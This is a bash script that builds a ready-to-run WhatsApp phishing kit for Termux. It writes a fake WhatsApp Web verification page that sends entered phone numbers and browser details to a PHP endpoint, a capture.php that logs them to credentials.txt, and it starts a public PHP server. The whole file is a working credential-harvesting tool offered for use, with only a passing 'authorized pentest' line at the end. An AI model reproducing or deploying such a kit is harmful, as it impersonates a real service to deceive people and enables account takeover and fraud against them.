cat > whatsapp_phish_setup.sh << 'EOF'
#!/bin/bash

echo "[+] Creating WhatsApp phishing page in Termux..."

# Create directory
mkdir -p whatsapp_phish && cd whatsapp_phish

# Create index.html
cat > index.html << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
            min-height: 100vh; 
            display: flex; align-items: center; justify-content: center; 
        }
        .container { max-width: 400px; width: 90%; padding: 20px; }
        .phone-frame { 
            background: #000; border-radius: 40px; padding: 60px 30px 40px; 
            box-shadow: 0 20px 60px rgba(0,0,0,0.3); position: relative; overflow: hidden; 
        }
        .phone-frame::before { 
            content: ''; position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
            width: 150px; height: 8px; background: #333; border-radius: 10px; 
        }
        .phone-screen { background: #f8f9fa; border-radius: 30px; height: 600px; overflow: hidden; }
        .whatsapp-header { 
            background: linear-gradient(135deg, #25d366, #128c7e); color: white; padding: 20px; 
            text-align: center; position: relative; 
        }
        .whatsapp-logo { 
            width: 40px; height: 40px; margin-bottom: 10px; 
            background: white; border-radius: 50%; padding: 8px; display: inline-block; 
        }
        .whatsapp-logo::before { content: '📱'; font-size: 20px; }
        .status { font-size: 14px; opacity: 0.9; }
        .login-form { padding: 40px 30px; text-align: center; }
        .form-header h1 { color: #333; font-size: 24px; margin-bottom: 8px; font-weight: 600; }
        .form-header p { color: #666; font-size: 14px; margin-bottom: 30px; }
        .country-selector { 
            display: flex; background: white; border-radius: 25px; padding: 4px; margin-bottom: 20px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; 
        }
        #countryCode { 
            background: #f8f9fa; border: none; padding: 15px 20px; border-radius: 20px; 
            font-size: 16px; color: #333; cursor: pointer; min-width: 90px; 
        }
        #phoneNumber { flex: 1; border: none; padding: 15px 20px; font-size: 16px; background: transparent; outline: none; }
        .verify-btn { 
            background: linear-gradient(135deg, #25d366, #128c7e); color: white; border: none; 
            padding: 15px 40px; border-radius: 25px; font-size: 16px; font-weight: 600; width: 100%; 
            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(37,211,102,0.4); 
        }
        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(37,211,102,0.5); }
        .loading { margin-top: 20px; text-align: center; display: none; }
        .spinner { 
            width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #25d366; 
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 480px) { .phone-frame { padding: 40px 20px 30px; margin: 20px 0; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-frame">
            <div class="phone-screen">
                <div class="whatsapp-header">
                    <div class="whatsapp-logo"></div>
                    <div class="status">Verifying your phone number</div>
                </div>
                <div class="login-form">
                    <div class="form-header">
                        <h1>Enter your phone number</h1>
                        <p>WhatsApp will send you a verification code</p>
                    </div>
                    <form id="loginForm">
                        <div class="country-selector">
                            <select id="countryCode">
                                <option data-code="+1">🇺🇸 +1</option>
                                <option data-code="+44">🇬🇧 +44</option>
                                <option data-code="+91">🇮🇳 +91</option>
                                <option data-code="+234">🇳🇬 +234</option>
                                <option data-code="+27">🇿🇦 +27</option>
                                <option data-code="+55">🇧🇷 +55</option>
                            </select>
                            <input type="tel" id="phoneNumber" placeholder="phone number" required>
                        </div>
                        <button type="submit" class="verify-btn">Next</button>
                        <div class="loading" id="loading">
                            <div class="spinner"></div>
                            <p>Sending verification code...</p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const countryCode = document.getElementById('countryCode').selectedOptions[0].dataset.code;
            const phoneNumber = document.getElementById('phoneNumber').value;
            
            if (!phoneNumber || phoneNumber.length < 9) {
                alert('Please enter a valid phone number');
                return;
            }
            
            document.querySelector('.verify-btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const data = {
                phone: countryCode + phoneNumber,
                country_code: countryCode,
                timestamp: new Date().toISOString(),
                ip: 'captured_client_ip',
                user_agent: navigator.userAgent
            };
            
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="text-align:center;padding:50px;background:#f8f9fa;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;">
                            <h2 style="color:#25d366;">✅ Verification code sent!</h2>
                            <p>Check your SMS messages</p>
                        </div>
                    `;
                }, 2000);
            } catch(e) {
                console.log('Captured locally:', data);
                setTimeout(() => alert('Verification sent! Check SMS.'), 2000);
            }
        });
    </script>
</body>
</html>
HTML

# Create PHP capture endpoint
cat > capture.php << 'PHP'
<?php
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $data = [
        'phone' => $input['phone'] ?? '',
        'country_code' => $input['country_code'] ?? '',
        'timestamp' => $input['timestamp'] ?? date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $input['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    $log = '[' . date('Y-m-d H:i:s') . '] ' . json_encode($data) . "\n";
    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    echo json_encode(['status' => 'success', 'message' => 'Captured']);
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
}
PHP

echo "[+] Files created: index.html, capture.php"
echo "[+] Captured credentials will be saved to: credentials.txt"

echo -e "\n[+] Starting PHP server on http://0.0.0.0:8080"
echo "[+] Press Ctrl+C to stop"
echo -e "\n🚀 Open your browser to: http://localhost:8080\n"

# Start server
php -S 0.0.0.0:8080 -t .
EOF

chmod +x whatsapp_phish_setup.sh
echo "[+] Script created! Run: bash whatsapp_phish_setup.sh"
echo -e "\n📱 WhatsApp phishing page ready for your authorized pentest!"
echo "📝 Credentials captured → whatsapp_phish/credentials.txt"